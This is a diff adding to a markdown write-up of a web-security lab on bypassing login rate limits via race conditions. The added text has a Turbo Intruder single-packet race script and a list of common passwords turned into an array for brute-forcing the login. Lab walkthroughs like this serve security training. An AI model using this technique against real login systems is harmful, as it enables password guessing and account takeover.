@@ -192,8 +192,75 @@
 <details>
     <summary>Lab: Bypassing rate limits via race conditions</summary>
 
+<img width="1414" height="858" alt="image" src="https://github.com/user-attachments/assets/02a3653f-ca20-4657-9b9b-eab50570d559" />
 
 
+
+
+
+## select password and send it to turbo intruder and select **`examples/race single packet attack.py`**
+
+<img width="763" height="162" alt="image" src="https://github.com/user-attachments/assets/9fee64ab-4e82-4b62-9948-8b336f9ffe10" />
+
+
+
+## edit it 
+
+```python
+
+passwords = ['']
+
+# the 'gate' argument withholds the final byte of each request until openGate is invoked
+for password in passwords:
+    engine.queue(target.req, password, gate='1')
+
+# once every 'race1' tagged request has been queued
+# invoke engine.openGate() to send them in sync
+engine.openGate('1')
+```
+
+
+
+## in console write :
+
+```javascript
+`123123
+abc123
+football
+monkey
+letmein
+shadow
+master
+666666
+qwertyuiop
+123321
+mustang
+123456
+password
+12345678
+qwerty
+123456789
+12345
+1234
+111111
+1234567
+dragon
+1234567890
+michael
+x654321
+superman
+1qaz2wsx
+baseball
+7777777
+121212
+000000`.split("\n")
+```
+
+### **`output`** `right click` -> `copy object`
+
+```ruby
+['123123', 'abc123', 'football', 'monkey', 'letmein', 'shadow', 'master', '666666', 'qwertyuiop', '123321', 'mustang', '123456', 'password', '12345678', 'qwerty', '123456789', '12345', '1234', '111111', '1234567', 'dragon', '1234567890', 'michael', 'x654321', 'superman', '1qaz2wsx', 'baseball', '7777777', '121212', '000000']
+```
 
 
     
